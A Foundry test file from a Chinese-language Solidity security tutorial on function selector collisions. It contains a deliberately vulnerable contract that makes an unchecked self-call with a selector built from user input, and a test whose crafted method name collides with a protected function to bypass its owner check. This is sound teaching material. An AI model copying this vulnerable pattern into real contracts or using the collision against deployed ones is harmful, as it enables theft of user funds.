// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";

/**
    WTF Solidity 合约安全: S02. 选择器碰撞

    ref https://www.wtf.academy/solidity-104/SelectorClash/

    command `forge test -vvv --contracts ./src/wtf/S02SelectorClash.sol`
 */

contract SelectorClash {
    bool public solved; // 攻击是否成功

    // 攻击者需要调用这个函数，但是调用者 msg.sender 必须是本合约。
    function putCurEpochConPubKeyBytes(bytes memory _bytes) public {
        require(msg.sender == address(this), "Not Owner");
        solved = true;
    }

    // 有漏洞，攻击者可以通过改变 _method 变量碰撞函数选择器，调用目标函数并完成攻击。
    function executeCrossChainTx(
        bytes memory _method,
        bytes memory _bytes,
        bytes memory _bytes1,
        uint64 _num
    ) public returns (bool success) {
        (success, ) = address(this).call(
            abi.encodePacked(
                bytes4(
                    keccak256(abi.encodePacked(_method, "(bytes,bytes,uint64)"))
                ),
                abi.encode(_bytes, _bytes1, _num)
            )
        );
    }
}

contract ContractTest is Test {
    function testSelectorClash() public {
        SelectorClash selectorClash = new SelectorClash();
        selectorClash.executeCrossChainTx(
            hex"6631313231333138303933",
            "",
            "",
            0
        );
        assertEq(selectorClash.solved(), true);
        console.log(
            "Attack succeed, change state variable `solved` to:",
            selectorClash.solved()
        );
    }
}
